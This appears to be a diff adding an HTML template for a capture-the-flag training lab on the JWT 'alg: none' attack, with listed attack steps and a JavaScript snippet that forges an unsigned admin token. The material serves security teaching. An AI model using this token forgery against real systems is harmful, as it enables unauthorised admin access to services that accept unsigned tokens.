@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>JWT None Algorithm - EliteHackLab</title><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"></head>
+<body>
+  <div class="matrix-bg"></div>
+  <nav class="main-nav"><div class="nav-brand"><span class="brand-icon">💀</span><span class="brand-text">Elite<span class="highlight">Hack</span>Lab</span></div><div class="nav-links"><a href="/"><i class="fas fa-home"></i> Dashboard</a><a href="/labs/jwt"><i class="fas fa-flask"></i> JWT Labs</a></div></nav>
+  <div class="lab-container">
+    <div class="lab-header"><h1>🎫 JWT Algorithm None Attack</h1><div class="lab-info"><span class="lab-tag difficulty-medium">Medium</span><span class="lab-tag points"><i class="fas fa-star"></i> 20 pts</span></div></div>
+    <div class="lab-section">
+      <h2><i class="fas fa-crosshairs"></i> Objective</h2>
+      <p>The server accepts tokens with algorithm "none". Craft a token without a signature, change your role to admin.</p>
+      <p><strong>Your current token:</strong></p>
+      <div class="code-block" style="word-break:break-all;"><%= token %></div>
+    </div>
+    <div class="lab-section">
+      <h2><i class="fas fa-terminal"></i> Token Verifier</h2>
+      <div class="vulnerable-form">
+        <label>Submit JWT token:</label>
+        <textarea id="jwtInput" rows="3" placeholder="Paste modified token here..."><%= token %></textarea>
+        <button onclick="verifyJwt()" class="btn">Verify Token</button>
+      </div>
+      <div id="jwtResult" class="result-box" style="margin-top:1rem;"></div>
+      <div class="code-block">Attack Steps:
+1. Decode the token (base64)
+2. Change header: {"alg":"none","typ":"JWT"}
+3. Change payload: {"user":"guest","role":"admin"}
+4. Remove signature (keep trailing dot)
+5. Result: BASE64(header).BASE64(payload).
+
+// JavaScript to forge:
+const header = btoa(JSON.stringify({"alg":"none","typ":"JWT"}));
+const payload = btoa(JSON.stringify({"user":"guest","role":"admin"}));
+const token = header + '.' + payload + '.';
+</div>
+    </div>
+    <div class="flag-submit">
+      <h3><i class="fas fa-flag"></i> Capture The Flag</h3>
+      <form onsubmit="submitFlagInline('jwt-none','flagInput_jwt1','flagResult_jwt1'); return false;" style="display:flex; gap:0.5rem; max-width:500px; margin:0 auto;"><input type="text" id="flagInput_jwt1" placeholder="FLAG{...}" autocomplete="off"><button type="submit" class="btn">Submit</button></form>
+      <div id="flagResult_jwt1" style="display:none; margin-top:1rem;"></div>
+    </div>
+  </div>
+  <script src="/js/main.js"></script>
+  <script>
+    async function verifyJwt() {
+      const res = await fetch('/labs/jwt/none-alg/verify', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({token:document.getElementById('jwtInput').value.trim()}) });
+      document.getElementById('jwtResult').innerHTML = '<pre>'+JSON.stringify(await res.json(),null,2)+'</pre>';
+    }
+  </script>
+</body>
+</html>
